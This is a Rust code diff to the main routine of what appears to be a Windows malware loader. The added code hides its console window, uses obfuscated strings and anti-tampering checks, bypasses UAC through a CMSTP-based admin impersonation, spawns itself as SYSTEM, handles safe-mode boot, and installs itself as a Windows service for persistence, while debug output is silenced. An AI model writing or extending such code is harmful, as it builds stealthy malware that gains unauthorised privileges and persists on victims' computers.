@@ -1,14 +1,21 @@
+#![windows_subsystem = "windows"]
+
 use lazy_static::lazy_static;
 use loader_vars::constants::{ system_log_directory, initial_log_directory };
 use safemode::utils::{ safemode_fail_safe, is_safe_mode };
+use service::utils::install_initial_service;
 use shared::{
     constants::logs_encryption_key,
     logs::logger::Logger,
-    uac::{ checks::{ is_elevated, is_system }, impersonate_admin::open_self_as_admin },
+    uac::{
+        checks::{ is_elevated, is_system },
+        impersonate_admin::{ open_self_as_admin, try_kill_cmstp },
+    },
     utils::{
         anti_tampering::is_clean,
         functions::{
             exit_1,
+            exit_1_insta,
             get_current_exe,
             is_running_from_system32,
             try_spawn_program_as_system,
@@ -16,7 +23,7 @@ use shared::{
     },
 };
 use windows_service_detector::is_running_as_windows_service;
-use std::sync::RwLock;
+use std::{ sync::RwLock, thread, time::Duration };
 use obfstr::obfstr as s;
 
 mod service;
@@ -33,7 +40,7 @@ macro_rules! log_internal {
         match &*$crate::LOGGER.read().unwrap() {
             Some(logger) => {
                 logger.log($level, s!($s));
-                println!("{:#?}",$s);
+                // println!("{:#?}",$s);
             }
             None => {}
         }
@@ -49,7 +56,7 @@ macro_rules! log_internal {
             match &*$crate::LOGGER.read().unwrap() {
                 Some(logger) => {
                 logger.log($level, &format!("{}{:#?}", s!($fmt), $($arg)*));
-                println!("{}{:#?}", $fmt, $($arg)*);
+                // println!("{}{:#?}", $fmt, $($arg)*);
             }
             None => {}
         }
@@ -122,6 +129,7 @@ fn main() {
     if let Ok(logger) = Logger::new(log_directory.clone(), logs_encryption_key()) {
         let mut lock = LOGGER.write().unwrap();
         *lock = Some(logger);
+        drop(lock);
     }
     info!("Init");
 
@@ -150,7 +158,7 @@ fn main() {
     if is_safe_mode() {
         if is_system {
             tag!("CLEANUP");
-            //! TODO
+            //;! TODO
         } else {
             tag!("LAUNCH-CLEANUP");
             if
@@ -161,8 +169,16 @@ fn main() {
             {
                 err!("Failed to spawn_program_as_system: ", error);
                 safemode_fail_safe();
+            } else {
+                let fail_safe_thread = thread::spawn(move || {
+                    let fail_safe_seconds = 8;
+                    thread::sleep(Duration::from_secs(fail_safe_seconds));
+                    warn!("FAIL SAFE TIMEOUT TRIGGERED");
+                    safemode_fail_safe();
+                });
+                let _ = fail_safe_thread.join();
+                exit_1_insta();
             }
-            exit_1();
         }
     }
 
@@ -171,13 +187,12 @@ fn main() {
         true
     });
     if is_service {
-        //! TODO
-        //! run service runner
+        // ;! TODO
     } else {
         if is_running_from_system_dir {
             if is_system {
                 tag!("SYS-SERVICE-INSTALL");
-                //! TODO
+                //;! TODO
             } else {
                 tag!("LAUNCH-SYS-SERVICE-INSTALL");
                 if
@@ -192,9 +207,16 @@ fn main() {
             }
         } else {
             tag!("INITIAL-SERVICE-INSTALL");
-            // try kill cmstp
 
-            // install itself as service
+            let cmstp_cleanup_handle = thread::spawn(move || {
+                let _ = try_kill_cmstp();
+            });
+            if let Err(error) = install_initial_service() {
+                err!("Failed to install_initial_service: ", error);
+            }
+
+            let _ = cmstp_cleanup_handle.join();
+            exit_1();
         }
     }
 }
